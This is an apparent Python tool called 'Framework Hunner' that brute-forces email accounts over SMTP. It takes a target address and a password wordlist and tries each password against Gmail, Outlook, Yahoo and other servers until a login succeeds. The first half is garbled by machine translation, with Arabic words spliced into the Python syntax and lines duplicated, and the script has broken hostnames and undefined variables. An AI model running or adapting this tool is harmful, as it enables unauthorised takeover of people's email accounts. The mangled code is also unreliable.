import استيراد smtplib
import استيراد نظام التشغيل، SYS
import وقت الاستيراد، عشوائي
import خيوط الاستيراد
import import argparse

ح = '\033[95م' '\033[95m'
ب = '\033[94م' '\033[94m'
ز = '\033[92م' '\033[92m'
ث = '\033[93م' '\033[93m'
و = '\033[91م' '\033[91m'
ه = '\033[0م' '\033[0m'
ش = '\033[4م' '\033[4m'
أو = '\033[33م' '\033[33m'

يخدم = لا شيء None
المنفذ = 587 587

os.chdir('الوحدات/')chdir('modules/')
المحلل اللغوي = argparse.ArgumentParser(وصف = "Framework Hunner")ArgumentParser(description="Framework Hunner")
parser.add_argument('تسجيل الدخول', مساعدة='البريد الإلكتروني المستهدف')add_argument('login', help='Target email')
parser.add_argument('كلمة المرور'، مساعدة='قائمة كلمات المرور')add_argument('password', help='Password list')
الحجج = parser.parse_args()parse_args()

if إذا كان args.login أو args.password:login or args.password:
تسجيل الدخول = args.loginlogin
كلمة المرور_قائمة = args.passwordpassword
إذا كان os.path.exists (password_list):if os.path.exists(password_list):
ملف = مفتوح (password_list،'r') open(password_list,'r')
آخر:else:
طباعة (F+"الملف غير موجود"+E)print(F+'File not exist'+E)
خروج النظام(1)exit(1)
def تعريف بانر ():banner():
النص 1 = ''' '''

#    ____    _    ____  _  __       _    ___     
#   |  _ \  / \  |  _ \| |/ /      / \  |_ _|    
#   | | | |/ _ \ | |_) | ' /_____ / _ \  | |     
#   | |_| / ___ \|  _ <| . \_____/ ___ \ | |     
#   |____/_/___\_\_| \_\_|\_\  _/_/ __\_\___|_   
#   |  _ \|  _ \     | |/ /   / \  | __ ) / _ \  
#   | | | | |_) |____| ' /   / _ \ |  _ \| | | | 
#   | |_| |  _ <_____| . \  / ___ \| |_) | |_| | 
#   |____/|_| \_\    |_|\_\/_/   \_\____/ \___/  
#                                                

>     \_\\___/ \__|
                                                    

	'''
	text2 = '''
	          _ _                                    
                                                     
	'''
	if random.randrange(0,1) == 0:
		print(text1)
	else:
		print(text2) 
def clear():
	os.system('clear')

def check_mail():
	global serv
	clear()
	banner()
	print(B+'Enter servese smtp:'+E)
	print(H+"""
		1) Gmail
		2) Outlook
		3) Yahoo
		4) At&T
		5) Mail.com
		6) Comcast
		7) By hand
		"""+E)
	ServerSmtp = input(W+'Hunner»Mail»ServerSmtp»'+E)
	if int(ServerSmtp) == 1:
		serv = 'smtp.gmail.com'
		port = 465
	elif int(ServerSmtp) == 2:
		serv = 'smtp-mail.outlook.com'
		port = 587
	elif int(ServerSmtp) == 3:
		serv = 'smtm.mail.yahoo.com'
		port = 587
	elif int(ServerSmtp) == 4:
		serv = 'smtm.mail.att.net'
		port = 465
	elif int(ServerSmtp) == 5:
		serv = 'smtm.mail.com'
		port = 587
	elif int(ServerSmtp) == 6:
		serv = 'smtm.comcast.com'
		port = 587
	elif int(ServerSmtp) == 7:
		serv = input('Enter smtp server (Exemple:smtp.gmail.com)')
		port = input('Enter port smtp server (Default port: 587)')
	else:
		print('Error ')
		sys.exit(1)

def brut():
	print(F+'Start brutforse'+E)
	try:
		smtp = smtplib.SMTP(str(serv), int(port))
		smtp.ehlo()
		smtp.starttls()
	except:
		print(error)
	for line in file:
		try:
			passw = line.strip('\r\n')
			smtp.login(login, passw)
			print(W+time.ctime()+B+' Work mail login-> '+W+login+B+' password-> '+W+passw)
			break
			sys.exit(1)
		except:
			print(F + time.ctime() + E + ' Not work ->'+E+login+E+'Password ->'+E+passw)

check_mail()
t1 = threading.Thread(target=brut)
t1.start()
